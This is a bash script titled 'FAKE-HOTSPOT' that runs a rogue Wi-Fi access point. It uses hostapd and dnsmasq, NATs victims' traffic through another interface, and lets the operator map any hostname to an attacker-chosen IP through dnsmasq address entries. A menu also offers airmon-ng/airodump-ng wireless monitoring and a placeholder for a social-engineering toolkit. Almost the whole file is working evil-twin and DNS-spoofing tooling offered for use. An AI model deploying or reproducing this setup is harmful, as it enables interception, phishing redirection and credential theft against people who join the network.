#!/bin/bash

echo "
███████╗░█████╗░██╗░░██╗███████╗░░░░░░██╗░░██╗░█████╗░████████╗░██████╗██████╗░░█████╗░████████╗
██╔════╝██╔══██╗██║░██╔╝██╔════╝░░░░░░██║░░██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗╚══██╔══╝
█████╗░░███████║█████═╝░█████╗░░█████╗███████║██║░░██║░░░██║░░░╚█████╗░██████╔╝██║░░██║░░░██║░░░
██╔══╝░░██╔══██║██╔═██╗░██╔══╝░░╚════╝██╔══██║██║░░██║░░░██║░░░░╚═══██╗██╔═══╝░██║░░██║░░░██║░░░
██║░░░░░██║░░██║██║░╚██╗███████╗░░░░░░██║░░██║╚█████╔╝░░░██║░░░██████╔╝██║░░░░░╚█████╔╝░░░██║░░░
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝░░░░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═════╝░╚═╝░░░░░░╚════╝░░░░╚═╝░░░"

###############################################
#Set interface to monitor mode
monitor_mode()
{
  echo "setting interface to monitor mode..."
  sudo airmon-ng check kill
  sudo airmon-ng start $INTERFACE
}
#################################################
#stop interface montiormode
monitor_mode_stop()
{
  $INTERFACE
  sudo airmon-ng stop $INTERFACE_STOP
}
##################################################
#start airodump to start monitoring
airodump()
{
  echo "starting airdump to start monitoring"
  INTERFACE_2=$INTERFACE"mon"
  gnome-terminal --window --command="bash -c 'sudo airodump-ng $INTERFACE_2; $SHELL'"
}
####################################################3
#deplaoys fake hotspot using Hostapd and creating config file
deploy_hotspot()
{
  #get user intput
  echo "   "
  read -p "Interface to deploy hotspot(wlan0): " INTERFACE_HOTSPOT
  read -p "Hotspot name(SSID): " HOTSPOT_NAME
  read -p "Channel 1-24: " CHANNEL
  read -p "Interface to give internet access(eth0): " INTERFACE_INTERNETT

  #setup config file for dnsmasq
  echo "interface=$INTERFACE_HOTSPOT
dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h
dhcp-option=3, 192.168.1.1
dhcp-option=6, 192.168.1.1
server=8.8.8.8
log-queries
listen-address=127.0.0.1" > dnsmasq.conf


  while [ true ]; do
    echo " "
    echo "To quit adding forwared host, press enter"
    read -p "Host name(google.com): " HOST_NAME
    read -p "Forwarded IP address: " IP_ADDRESS

    if [ -z $HOST_NAME ]
      then break

    elif [ -z $IP_ADDRESS ]
      then break

    else echo "address=/$HOST_NAME/$IP_ADDRESS" >> dnsmasq.conf
    fi
  done

  #kill processes runningin background
  sudo killall dnsmasq &> /dev/null
  sudo killall hostapd &> /dev/null

  #setup the config file for hostapd
  echo "interface=$INTERFACE_HOTSPOT
ssid=$HOTSPOT_NAME
channel=$CHANNEL
macaddr_acl=0
driver=nl80211
ignore_broadcast_ssid=0" > hostapd.conf

  #start dnsmaq to provide user with IP address
  sudo ifconfig $INTERFACE_HOTSPOT up 192.168.1.1 netmask 255.255.255.0
  sudo route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

  #start dnsmasq in new terminal
  gnome-terminal --window -- /bin/sh -c "sudo dnsmasq -C dnsmasq.conf -d --no-resolv --no-hosts --dns-loop-detect --quiet-ra --quiet-dhcp6 --quiet-dhcp"

  #Give internet access
  iptables --table nat --append POSTROUTING --out-interface $INTERFACE_INTERNETT -j MASQUERADE
  iptables --append FORWARD --in-interface $INTERFACE_HOTSPOT -j ACCEPT
  echo 1 > /proc/sys/net/ipv4/ip_forward

  #start hostapd
  gnome-terminal --window -- /bin/sh -c "sudo hostapd hostapd.conf"
}

deploy_hotspot_pass()
{
  #get user intput
  echo "   "
  read -p "Interface to deploy hotspot(wlan0): " INTERFACE_HOTSPOT
  read -p "Hotspot name(SSID): " HOTSPOT_NAME
  read -p "Password(min lenght 8): " PASS
  read -p "Channel 1-24: " CHANNEL
  read -p "Interface to give internet access(eth0): " INTERFACE_INTERNETT

  #kill processes runningin background
  sudo killall dnsmasq &> /dev/null
  sudo killall hostapd &> /dev/null

  #setup config file for dnsmasq
  echo "interface=$INTERFACE_HOTSPOT
dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h
dhcp-option=3, 192.168.1.1
dhcp-option=6, 192.168.1.1
server=8.8.8.8
log-queries
listen-address=127.0.0.1" > dnsmasq.conf


  while [ true ]; do
    echo " "
    echo "To quit adding forwared host, press enter"
    read -p "Host name(google.com): " HOST_NAME
    read -p "IP to forward to: " IP_ADDRESS

    if [ -z $HOST_NAME ]
      then break

    elif [ -z $IP_ADDRESS ]
      then break

    else echo "address=/$HOST_NAME/$IP_ADDRESS" >> dnsmasq.conf
    fi
  done

  #setup the config file for hostapd
  echo "interface=$INTERFACE_HOTSPOT
ssid=$HOTSPOT_NAME
channel=$CHANNEL
macaddr_acl=0
driver=nl80211
ignore_broadcast_ssid=0

wpa=2
wpa_passphrase=$PASS
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP" > hostapd.conf

  #start dnsmaq to provide user with IP address
  sudo ifconfig $INTERFACE_HOTSPOT up 192.168.1.1 netmask 255.255.255.0
  sudo route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

  #start dnsmasq in new terminal
  gnome-terminal --window -- /bin/sh -c "sudo dnsmasq -C dnsmasq.conf -d --no-resolv --no-hosts --dns-loop-detect --quiet-ra --quiet-dhcp6 --quiet-dhcp"

  #Give internet access
  iptables --table nat --append POSTROUTING --out-interface $INTERFACE_INTERNETT -j MASQUERADE
  iptables --append FORWARD --in-interface $INTERFACE_HOTSPOT -j ACCEPT
  echo 1 > /proc/sys/net/ipv4/ip_forward

  #start hostapd
  gnome-terminal --window -- /bin/sh -c "sudo hostapd hostapd.conf"
}

Download_update()
{
  #installing and updateing tolls needed.
  sudo apt-get install aircrack-ng
  sudo apt-get install dnsmasq
  sudo apt-get install hostapd
}
####################################################
#executes functions based on option chosen
while [ true ]; do
  #user input for wanted option
  read -p "

  1. Deploy Hotspot
  2. Deploy Hotspot (password protected)
  3. Monitor Netwokrs
  4. SE-toolkit
  5. Exit
  Enter option: " INPUT

  #if stamtnet for option to run
  if [ $INPUT = 1 ]
    then deploy_hotspot

  elif [ $INPUT = 2 ]
    then deploy_hotspot_pass

  elif [ $INPUT = 3 ]
    then read -p "Network interface: " INTERFACE; monitor_mode; airodump

  elif [ $INPUT = 4 ]
    then echo "Under work"

  elif [ $INPUT = 5 ]
    then echo "Exiting, good bye..."; break

  else echo "Input was not valid, try again";
  fi
done
